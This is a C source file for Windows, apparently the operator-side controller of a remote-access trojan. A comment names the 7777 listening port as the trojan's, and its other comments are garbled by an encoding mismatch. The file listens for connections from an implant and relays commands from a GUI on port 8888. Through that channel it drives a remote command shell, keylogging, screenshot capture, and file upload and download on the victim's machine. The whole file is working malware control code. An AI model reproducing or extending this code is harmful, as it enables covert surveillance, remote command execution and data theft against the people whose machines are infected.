#include <stdio.h> 
#include <stdlib.h> 
#include <string.h> 
#include <WinSock2.h> 
#include <time.h>

#define PORT 7777  //Trojan����˶˿�
#define SERVER_IP "127.0.0.1"   //T�����IP
#define GUI_IP "127.0.0.1"//GUI�ͻ���IP
#define PORT1 8888 //GUI�ͻ��˶˿�

#define BUFFER_SIZE 1024    //���ܳ���
#define FILE_NAME_MAX_SIZE 512   //�ļ�����󳤶�

#define WrongOp "The chioce is wrong, please input again!\n"
#define KeyNot "10 sec or 30 characters to exit!\n"

#pragma comment(lib, "WS2_32") 

void sendFile(SOCKET c_Socket, SOCKET G_Socket);   //�����ļ�����
void recvFile(SOCKET c_Socket, SOCKET G_Socket);    //�����ļ�����
void recvCMD(SOCKET m_New_Socket, SOCKET G_Socket);    //����CMD����

SOCKET createSocket()
{
	//��������ʼ��GUI�ĵ�ַ�ṹ
	int nRet =0;
    SOCKADDR_IN addrGUI;
    addrGUI.sin_addr.S_un.S_addr = inet_addr(GUI_IP);
    addrGUI.sin_family = AF_INET;
    addrGUI.sin_port = htons(PORT1);
	//��ʼ��GUI socket dll
	WSADATA wsaData1;
	WORD socketVersion1 = MAKEWORD(2,0);
	if(WSAStartup(socketVersion1, &wsaData1) != 0)
	{
	  printf("Init GUI socket dll error!\n");
	  exit(1);
	}
	//����GUI socket
	SOCKET G_Socket = socket(AF_INET, SOCK_STREAM, 0);
	if(SOCKET_ERROR == G_Socket)
	{
	  printf("Create GUI Socket Error!\n");
	  exit(1);
	}
	//GUI socket ���ӿͻ���IP
	nRet = WSAStartup(MAKEWORD(2,2), &wsaData1);
	while(1)
	{
		nRet = connect(G_Socket, (LPSOCKADDR)&addrGUI, sizeof(addrGUI));
		if (nRet == SOCKET_ERROR ) 
		{ 
		    printf("Can Not Connect To GUI IP!\n"); 
			//system("pause"); 
			//exit(1); 
		}
		if(nRet != SOCKET_ERROR)
		{	
			printf("GUI Succcess!\n");
			return G_Socket;
		}
	}
}

int main() 
{ 
  char Options[] = "Please input Choices c:CMD k:KeyLog s:sendFiles r:recvFiles p:PtrSc e:exit\n";
  // ��������ʼ��һ�������(����)�ĵ�ַ�ṹ 
  sockaddr_in server_addr; 
  server_addr.sin_family = AF_INET; 
  server_addr.sin_addr.S_un.S_addr = INADDR_ANY; 
  server_addr.sin_port = htons(PORT); 
	  
  SOCKET G_Socket; //GUI Socket
  G_Socket = createSocket();// GUI Socket
  char G_buf[1024] = {0};//GUI Buf

  if(G_Socket == SOCKET_ERROR )
	  printf("G_Socket ERROR!\n");

  // ��ʼ��socket dll 
  WSADATA wsaData; 
  WORD socketVersion = MAKEWORD(2, 0); 
  if(WSAStartup(socketVersion, &wsaData) != 0) 
  { 
    printf("Init socket dll error!\n"); 
    exit(1); 
  } 
  
  // ����socket 
  SOCKET m_Socket = socket(AF_INET, SOCK_STREAM, 0); 
    if (SOCKET_ERROR == m_Socket) 
    { 
      printf("Create Socket Error!"); 
    exit(1); 
    } 
  
  //��socket�ͷ����(����)��ַ 
  if (SOCKET_ERROR == bind(m_Socket, (LPSOCKADDR)&server_addr, sizeof(server_addr))) 
  { 
    printf("Server Bind Failed: %d", WSAGetLastError()); 
    exit(1); 
  } 
  
  //���� 
  if (SOCKET_ERROR == listen(m_Socket, 10)) 
  { 
    printf("Server Listen Failed: %d", WSAGetLastError()); 
    exit(1); 
  } 
  
	
  	char buffer[BUFFER_SIZE]; //���ܵ��ַ�
	char c;//ѡ��
	char comd[5] = {0}; //�������
  
  while(1) 
  { 
    printf("Listening To Server...\n"); 
  
    sockaddr_in client_addr; 
    int client_addr_len = sizeof(client_addr); 
  
    SOCKET m_New_Socket = accept(m_Socket, (sockaddr *)&client_addr, &client_addr_len); 
    if (SOCKET_ERROR == m_New_Socket) 
    { 
      printf("Server Accept Failed: %d", WSAGetLastError()); 
      break; 
    } 
	
	recv(m_New_Socket, buffer, sizeof(buffer),0);//�ж��Ƿ�ɹ�
	send(G_Socket, buffer, sizeof(buffer), 0);  //TO GUI
	printf("%s",buffer);
	memset(buffer,0, BUFFER_SIZE);
	Sleep(500);

//	while(1)
//	{
//	if(m_New_Socket != SOCKET_ERROR)
//	{
		
			send(G_Socket, Options, sizeof(Options), 0); //to GUI
			printf("%s", Options);  //���ѡ��
			//gets(&c);from cmd
			recv(G_Socket, G_buf, 5, 0); //from GUI
			printf("Option is : %s\n",G_buf);
			c = G_buf[0];
			if( c != NULL )
			{
				if(c=='s'){
				sendFile(m_New_Socket, G_Socket);
				//closesocket(m_New_Socket);
			}
				else if(c=='r'){
				recvFile(m_New_Socket, G_Socket);
				//closesocket(m_New_Socket);
			}
			else if(c == 'e'){
				comd[0] = c;
				send(m_New_Socket,comd,5,0);  //to server
				recv(m_New_Socket, buffer, sizeof(buffer),0);  //from server
				send(G_Socket, buffer, sizeof(buffer), 0);  //to GUI
				printf("%s",buffer);
				memset(buffer,0, BUFFER_SIZE);
				closesocket(m_New_Socket);
				break;
			}
			else if(c == 'k'){
				comd[0] = c;	
				send(m_New_Socket,comd,5,0);	//to Server	
				send(G_Socket , KeyNot, sizeof(KeyNot), 0 ); //to GUI
				printf("%s", KeyNot);
				//scanf("%c",&comd[0]);
				recv(m_New_Socket, buffer, sizeof(buffer),0);  //from Server
				send(G_Socket, buffer, sizeof(buffer), 0); //to GUI
				printf("%s",buffer);	
				memset(buffer,0, BUFFER_SIZE);
				//closesocket(m_New_Socket);
			}
			else if(c == 'p'){
				comd[0] = c;
				send(m_New_Socket,comd,5,0); //to Server
				recv(m_New_Socket, buffer, sizeof(buffer),0);  //from Server
				send(G_Socket, buffer, sizeof(buffer), 0); //to GUI
				printf("%s",buffer);
				memset(buffer,0, BUFFER_SIZE);
			}
			else if(c == 'c'){
				comd[0] = c;
				send(m_New_Socket,comd,5,0); //to server
				//recv(G_Socket, G_buf, sizeof(G_buf), 0);// from GUI		
				//send(m_New_Socket,G_buf,5,0);  //To Server
				//memset(G_buf, 0, sizeof(G_buf));

				recvCMD(m_New_Socket, G_Socket); 
				//recv(m_New_Socket, buffer, sizeof(buffer),0);
				//printf("%s",buffer);
				memset(buffer,0, BUFFER_SIZE);
			}
			else{
				send(G_Socket, WrongOp, sizeof(WrongOp), 0); //to GUI  ������Ϣ
				printf("%s", WrongOp);
			
				//closesocket(m_New_Socket);
			}
			//gets(&c);
		
//	}// end if
//	}//end while

			}//end if not
		closesocket(m_New_Socket);

 } 
  
  closesocket(m_Socket); 
  //�ͷ�winsock�� 
  WSACleanup(); 
  return 0; 
} 

void recvCMD(SOCKET c_Socket, SOCKET G_Socket){
	char comdbuf[100] = {0};
	char rbuf[2048] = {0};
	char cmdbg[] = "CMD is beginning, input 'quit' to exit\n";
	char cmdq[] = "CMD is exit, byebye!\n";
	send(G_Socket, cmdbg, sizeof(cmdbg), 0);
//	printf("CMD is beigining, quit to exit:");
//	recv(c_Socket, rbuf, sizeof(rbuf),0 );
	while(1){
		//scanf("%s",comdbuf);
		memset(comdbuf, 0, sizeof(comdbuf));
		Sleep(100);
		recv(G_Socket, comdbuf, sizeof(comdbuf)-1, 0 );  //from GUI
		printf("-----Command: %s\n", comdbuf); //comdbuf
		Sleep(100);
		send(c_Socket, comdbuf, sizeof(comdbuf),0 );  //to server
		if(strnicmp(comdbuf, "quit", 4) == 0)
		{
			send(G_Socket, cmdq, sizeof(cmdq), 0); //to GUI
			printf("%s", cmdq); //quit
			break;
		}
		recv(c_Socket, rbuf, sizeof(rbuf),0 ); //from server
		Sleep(100);
		send(G_Socket, rbuf, sizeof(rbuf), 0); //to GUI
		printf("%s\n",rbuf);
		memset(rbuf,0, sizeof(rbuf));
		memset(comdbuf, 0, sizeof(comdbuf));

	}
	return;
}

void recvFile(SOCKET c_Socket, SOCKET G_Socket){
  //�����ļ��� 
  char bufferr[5]; 
 // char rbuf[FILE_NAME_MAX_SIZE+1];
  char rsuc[] = "Receive File From Server Successful!\n";
  char Sfile[] = "Please Input File Name On Server: ";  //��Ҫ�ӷ���˽��ܵ��ļ�
  char Cfile[] = "Please Input File Name On Client: ";  //���ش���ļ��ĵ�ַ
  char rfail[] = "Send File Name Failed\n";  //�����ļ�����
  char ropen[] = "File: Can Not Open To Write\n"; //���ܴ��ļ�

  memset(bufferr, 0, 1);
  bufferr[0]='r';
  send(c_Socket, bufferr, 5, 0);
  char file_name[FILE_NAME_MAX_SIZE+1]; 
  char filename[FILE_NAME_MAX_SIZE+1]; 
  memset(file_name, 0, FILE_NAME_MAX_SIZE+1); 
  memset(filename, 0, FILE_NAME_MAX_SIZE+1); 
//  printf("Please Input File Name On Server: "); 
  send(G_Socket, Sfile, sizeof(Sfile), 0);//to GUI
  printf("%s",Sfile);
  recv(G_Socket, file_name, sizeof(file_name), 0); //from GUI
  printf("%s\n",file_name);
  //scanf("%s", &file_name); 
  //printf("Please Input File Name On Client: "); 
  send(G_Socket, Cfile, sizeof(Cfile), 0);  //to GUI
  printf("%s", Cfile);
  //scanf("%s", &filename); 
  recv(G_Socket, filename, sizeof(filename), 0);
  printf("%s\n", filename);
  
  char buffer[BUFFER_SIZE]; 
  memset(buffer, 0, BUFFER_SIZE); 
  strncpy(buffer, file_name, strlen(file_name)>BUFFER_SIZE ? BUFFER_SIZE:strlen(file_name)); 
  
  //������������ļ��� 
  if(send(c_Socket, buffer, BUFFER_SIZE, 0) < 0) 
  { 
	send(G_Socket, rfail, sizeof(rfail), 0);   //TO GUI ������Ϣ
    printf("%s",rfail); 
	
  //  system("pause"); 
  //  exit(1); 
  } 
  
  //���ļ���׼��д�� 
  FILE * fp = fopen(filename, "wb"); //windows����"wb",��ʾ��һ��ֻд�Ķ������ļ� 
  if(NULL == fp) 
  { 
	Sleep(200);
	send(G_Socket, ropen, sizeof(ropen), 0);  //������Ϣ
    printf("%s", ropen); 
  //  system("pause"); 
  //  exit(1); 
  } 
  else
  { 
    memset(buffer, 0, BUFFER_SIZE); 
    int length = 0; 
    while ((length = recv(c_Socket, buffer, BUFFER_SIZE, 0)) > 0) 
    { 
      if (fwrite(buffer, sizeof(char), length, fp) < 1024) 
      { 
		  send(G_Socket, rsuc, sizeof(rsuc), 0);  //to GUI
		  printf("%s", rsuc);
        break; 
      } 
      memset(buffer, 0, BUFFER_SIZE); 
    } 
  
     
  } 
  
  fclose(fp); 
}

void sendFile(SOCKET c_Socket, SOCKET G_Socket){
	char bufferr[5]; 
	char Sfile[] = "Please Input File Name On Server(new filename): "; //�����������ϵ��ļ�����
	char Cfile[] = "Please Input File Name On Client: ";   //�ӱ����ϴ����ļ�����
	char ssuc[] = "File Transfer Successful!\n";
	char sfail[] = "Send File Name Failed\n";//  send failed
	char sfind[] = "File: Not Found\n"; //find file failed

    memset(bufferr, 0, 1);
	bufferr[0]='s';
	send(c_Socket, bufferr, 5, 0);
  char file_name[FILE_NAME_MAX_SIZE+1]; 
  char filename[FILE_NAME_MAX_SIZE+1]; 
  memset(file_name, 0, FILE_NAME_MAX_SIZE+1); 
  memset(filename, 0, FILE_NAME_MAX_SIZE+1); 

  //printf("Please Input File Name On Client: ");
  send(G_Socket, Cfile, sizeof(Cfile), 0);  //to GUI
  printf("%s", Cfile);
  //scanf("%s", &file_name);
  recv(G_Socket, file_name, sizeof(file_name), 0); //from GUI
  printf("%s\n", file_name);
 // printf("Please Input File Name On Server(new filename): "); 
  send(G_Socket, Sfile, sizeof(Sfile), 0);  //to GUI
  printf("%s", Sfile);
  recv(G_Socket, filename, sizeof(filename), 0);
  printf("%s\n", filename);
  //scanf("%s", &filename); 

  char buffer[BUFFER_SIZE]; 
  memset(buffer, 0, BUFFER_SIZE); 
  strncpy(buffer, filename, strlen(filename)>BUFFER_SIZE ? BUFFER_SIZE:strlen(filename)); 
  
  //������������ļ��� 
  if(send(c_Socket, buffer, BUFFER_SIZE, 0) < 0) 
  { 
	send(G_Socket, sfail, sizeof(sfail), 0);  //������Ϣ
	Sleep(100);
    printf("%s", sfail); 
	return;
  
  } 
   FILE * fp = fopen(file_name, "rb"); //windows����"rb",��ʾ��һ��ֻ���Ķ������ļ� 
    if (NULL == fp) 
    { 
	  send(G_Socket, sfind, sizeof(sfind), 0);  //TO GUI ������Ϣ
	  Sleep(100);
      printf("%s", sfind); 

	  return;
    } 
        else
    { 
      memset(buffer, 0, BUFFER_SIZE); 
      int length = 0; 
  
      while ((length = fread(buffer, sizeof(char), BUFFER_SIZE, fp)) > 0) 
      { 
        if (send(c_Socket, buffer, length, 0) < 0) 
        { 
		  send(G_Socket, sfail, sizeof(sfail), 0);  //TO GUI ������Ϣ
          printf("%s", sfail); 

		  return;
        } 
        memset(buffer, 0, BUFFER_SIZE); 
      } 
  
      fclose(fp); 
	  send(G_Socket, ssuc, sizeof(ssuc), 0);
      printf("%s", ssuc); 
		}

}
